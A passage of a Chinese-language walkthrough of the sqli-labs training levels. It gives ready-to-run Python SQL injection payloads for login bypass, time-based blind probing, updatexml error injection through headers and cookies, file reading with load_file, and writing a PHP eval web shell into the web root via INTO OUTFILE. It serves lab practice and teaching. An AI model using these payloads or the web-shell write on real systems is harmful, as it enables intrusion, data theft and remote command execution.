</code></pre></div><img alt="img" loading="lazy" width="1710" height="338" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:100%;height:auto" src="/_next/static/media/L5.15bd70af.jpg"/><h3 class="x-h2">补充：L7文件读写</h3><div class="x-highlightblock highlight-background-golden"><h4 class="x-h3">前置准备（攻击条件）</h4><p class="x-p">需要开启<code class="x-inline-highlight">secure_file_priv</code>，其默认值为<code class="x-inline-highlight">NULL</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>mysql> show variables like 'secure_file_priv';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | NULL  |
+------------------+-------+
</code></pre></div><p class="x-p">我使用的环境是PHPStudy，修改<code class="x-inline-highlight">PHPStudy\Extensions\MySQL5.7.26\my.ini</code>文件：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>[mysqld]
...
secure_file_priv=
</code></pre></div><p class="x-p">在<code class="x-inline-highlight">[mysqld]</code>下添加<code class="x-inline-highlight">secure_file_priv=</code>，然后重启MySQL服务。</p></div><div class="x-highlightblock highlight-background-blue"><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">读文件（如果有回显）：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/path/to/file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--</span></code></pre></div></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">写入文件（MySQL限制<code class="x-inline-highlight">INTO OUTFILE</code>不能覆盖已存在的文件）：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68656c6c6f</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/path/to/file'</span> <span class="token comment">--</span></code></pre></div><p class="x-p">这会创建一个<code class="x-inline-highlight">/path/to/file</code>文件：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>1   2   hello</code></pre></div></div></div></div><p class="x-p">写入一个木马（需要知道<code class="x-inline-highlight">WWW</code>的路径）：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>root <span class="token operator">=</span> <span class="token string">r"C:\\path\\to\\WWW\\sqli-labs\\Less-7\\"</span>

shell <span class="token operator">=</span> <span class="token string">'&lt;?php @eval($_GET["cmd"]); ?>'</span>
shell_hex <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> shell<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
shell_path <span class="token operator">=</span> root <span class="token operator">+</span> <span class="token string">"shell.php"</span>

payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=x')) UNION SELECT '','',</span><span class="token interpolation"><span class="token punctuation">{</span>shell_hex<span class="token punctuation">}</span></span><span class="token string"> INTO OUTFILE '</span><span class="token interpolation"><span class="token punctuation">{</span>shell_path<span class="token punctuation">}</span></span><span class="token string">' -- "</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># ?id=x')) UNION SELECT '','',0x3c3f70687020406576616c28245f4745545b22636d64225d293b203f3e INTO OUTFILE '...' --</span>

query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</code></pre></div><img alt="img" loading="lazy" width="1834" height="537" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:100%;height:auto" src="/_next/static/media/L7.a79af0e3.jpg"/><h2 class="x-h1">登陆框：L11-L16</h2><h3 class="x-h2">前言 &amp; 笔记</h3><p class="x-p">这几个Lab是通过登陆框进行SQL注入，这里以成功绕过登陆作为通关条件。</p><h3 class="x-h2">L11</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x' OR 1=1 -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-11"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L12</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'x") OR 1=1 -- '</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-12"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L13</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x') OR 1=1 -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-13"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L14</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'x" OR 1=1 -- '</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-14"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L15</h3><p class="x-p">L15关闭了报错回显，因此不能直接得到闭合方式，考虑使用时间盲注探测：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">from</span> query <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests

payloads <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'x"   OR sleep(10) -- '</span><span class="token punctuation">,</span>
    <span class="token string">'x")  OR sleep(10) -- '</span><span class="token punctuation">,</span>
    <span class="token string">'x")) OR sleep(10) -- '</span><span class="token punctuation">,</span>
    <span class="token string">"x'   OR sleep(10) -- "</span><span class="token punctuation">,</span>
    <span class="token string">"x')  OR sleep(10) -- "</span><span class="token punctuation">,</span>
    <span class="token string">"x')) OR sleep(10) -- "</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        query_post<span class="token punctuation">(</span><span class="token string">"Less-15"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Vulnerable payload:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
<span class="token comment"># [*] Vulnerable payload: x'   OR sleep(10) --</span>

payload <span class="token operator">=</span> <span class="token string">"x' OR 1=1 -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-15"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L16</h3><p class="x-p">L16也关闭了报错回显，同样的时间盲注探测方式，闭合方式为<code class="x-inline-highlight">")</code>。</p><h2 class="x-h1">报错注入应用：L17-L22</h2><h3 class="x-h2">L17</h3><p class="x-p">L17需要输入一个已经存在的账户名才能进入后面的逻辑，这里使用<code class="x-inline-highlight">admin</code>。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$update</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span></code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-17"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p class="x-p">注意这关如果改掉了某个账户的密码，可能会影响后面的Lab。</p><h3 class="x-h2">L18</h3><p class="x-p">L18需要一对正确的账密才能进入后面的逻辑，这里使用<code class="x-inline-highlight">admin:admin</code>。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
<span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x', 0, updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #"</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-18"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">payload</code>通过<code class="x-inline-highlight">User-Agent</code>Header传入，发现在服务端解析时会删掉末尾的空格，而<code class="x-inline-highlight">--</code>注释符后面必须跟一个空格才能生效，因此这里使用<code class="x-inline-highlight">#</code>作为注释符。</p><h3 class="x-h2">L19</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$referrer</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
<span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `security`.`referers` (`referers`, `ip_address`) VALUES ('<span class="token interpolation"><span class="token variable">$referrer</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>')"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">注：作者原本写的是<code class="x-inline-highlight">&#36;uagent = &#36;_SERVER['HTTP_REFERER'];</code>，这里把变量名改过来了。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x', updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #"</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-19"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L20</h3><p class="x-p">从Cookie注入：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #"</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-20"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L21</h3><p class="x-p">同样是从Cookie注入，但是多了一层Base64。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$cookee</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span>
